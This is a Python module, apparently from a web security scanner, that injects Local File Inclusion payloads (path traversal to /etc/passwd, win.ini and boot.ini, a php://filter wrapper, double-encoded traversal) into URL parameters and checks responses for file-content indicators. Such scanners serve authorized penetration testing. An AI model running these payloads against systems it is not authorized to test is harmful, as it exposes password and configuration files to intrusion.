import asyncio
from modules.core import console

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "/etc/passwd",
    "c:\\windows\\win.ini",
    "../../../../boot.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "%252e%252e%252fetc%252fpasswd"
]

LFI_INDICATORS = [
    "root:x:0:0",
    "[extensions]",
    "[boot loader]",
    "default_socket_timeout",
    "daemon:x"
]

async def test_lfi_url(session, url, param, payload):
    target = url.replace(f"{param}=", f"{param}={payload}")
    try:
        async with session.get(target, timeout=5) as resp:
            text = await resp.text()
            for indicator in LFI_INDICATORS:
                if indicator in text:
                     return {
                         "url": target,
                         "param": param,
                         "payload": payload,
                         "indicator": indicator
                     }
    except Exception:
        pass
    return None

async def scan_lfi(session, fuzzable_urls):
    """
    Scan URLs with parameters for LFI.
    """
    console.print(f"\n[bold cyan]--- Local File Inclusion (LFI) Scanner ---[/bold cyan]")
    
    if not fuzzable_urls:
         console.print("[yellow][!] No parameters found to fuzz.[/yellow]")
         return []
         
    console.print(f"[dim]Testing {len(fuzzable_urls)} URLs with {len(LFI_PAYLOADS)} payloads...[/dim]")
    
    vulnerable = []
    tasks = []
    
    for url in fuzzable_urls:
        if "=" in url:
            base, qs = url.split("?", 1)
            params = qs.split("&")
            for p in params:
                if "=" in p:
                    key = p.split("=")[0]
                    for payload in LFI_PAYLOADS:
                        tasks.append(test_lfi_url(session, url, key, payload))
                        
    results = await asyncio.gather(*tasks)
    
    for res in results:
        if res:
             console.print(f"  [bold red][!] LFI VULNERABILITY FOUND![/bold red]")
             console.print(f"      URL: {res['url']}")
             console.print(f"      Payload: {res['payload']}")
             vulnerable.append(res)
             
    if not vulnerable:
        console.print("[green][+] No LFI vulnerabilities detected.[/green]")
        
    return vulnerable
